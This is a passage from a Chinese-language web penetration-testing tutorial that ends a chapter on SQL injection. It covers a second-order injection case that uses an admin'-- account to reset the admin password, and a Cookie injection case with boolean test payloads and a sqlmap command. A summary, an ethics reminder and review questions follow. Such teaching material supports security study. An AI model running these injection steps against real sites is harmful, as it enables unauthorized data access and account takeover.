1. 先注册一个admin账号（如果不存在）
2. 注册admin'--账号
3. 登录admin'--账号
4. 修改密码为hacked123
5. 尝试用admin/hacked123登录
6. 登录成功，验证漏洞存在

### 5.19.6 案例6：Cookie注入实战

**场景描述**
某电商网站的Cookie参数存在SQL注入。

**漏洞发现过程**
1. 浏览网站时注意到Cookie中有user_id=1
2. 修改Cookie为user_id=1'，刷新页面
3. 页面报错，确认存在Cookie注入

**测试步骤**
```
# 正常Cookie
Cookie: user_id=1
# 页面正常

# 测试单引号
Cookie: user_id=1'
# 页面报错

# 测试布尔注入
Cookie: user_id=1 AND 1=1
# 正常

Cookie: user_id=1 AND 1=2
# 异常
```

**漏洞利用**
```bash
# 使用SQLMap
sqlmap -u "http://shop.example.com/user/center" --cookie="user_id=1*" --dbs
```

## 5.20 本章小结

本章详细介绍了SQL注入漏洞的各个方面，包括注入原理、检测方法、各种注入类型、绕过技巧和实战案例。

**关键要点回顾**

1. SQL注入是危害最大的Web漏洞之一，可能导致数据泄露、篡改甚至系统入侵
2. SQL注入分为Union注入、报错注入、布尔盲注、时间盲注、堆叠注入、宽字节注入、二次注入等多种类型
3. 检测方法包括手工检测和自动化工具检测（SQLMap、Burp Suite等）
4. 注入点不仅在GET/POST参数，还可能在Cookie、HTTP头、JSON、XML等位置
5. 绕过技巧包括关键字绕过、空格绕过、引号绕过、WAF绕过等20+种方法
6. SQLMap是最强大的SQL注入工具，掌握其高级用法可以大大提高效率
7. 手工注入能力同样重要，能帮助理解原理和应对特殊场景
8. 不同数据库（MySQL、MSSQL、Oracle、PostgreSQL）的注入语法有差异
9. SQL注入的修复需要从代码层面、架构层面多管齐下
10. 实战中要遵守法律和道德规范，避免造成数据破坏

**下一章预告**

下一章我们将学习XSS跨站脚本漏洞挖掘，包括XSS类型、检测方法、利用技巧和实战案例。

---

**思考题**

1. Union注入的前提条件是什么？
2. 布尔盲注和时间盲注有什么区别？
3. 如何检测二次注入？
4. SQL注入绕过WAF有哪些方法？
5. 为什么预编译语句可以防止SQL注入？
6. 宽字节注入的原理是什么？
7. MySQL、MSSQL、Oracle的注入有哪些差异？
8. 如何评估SQL注入漏洞的严重程度？
9. SQL注入的修复方法有哪些？
10. 实战测试SQL注入需要注意什么？
